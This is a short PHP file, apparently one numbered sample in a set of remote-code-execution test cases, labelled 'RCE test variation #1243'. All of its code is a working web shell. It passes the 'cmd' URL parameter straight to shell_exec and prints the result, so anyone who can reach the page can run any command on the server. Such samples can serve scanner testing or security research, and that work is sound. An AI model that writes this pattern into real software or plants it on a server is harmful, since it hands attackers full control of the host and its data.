<?php
// RCE test variation #1243
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>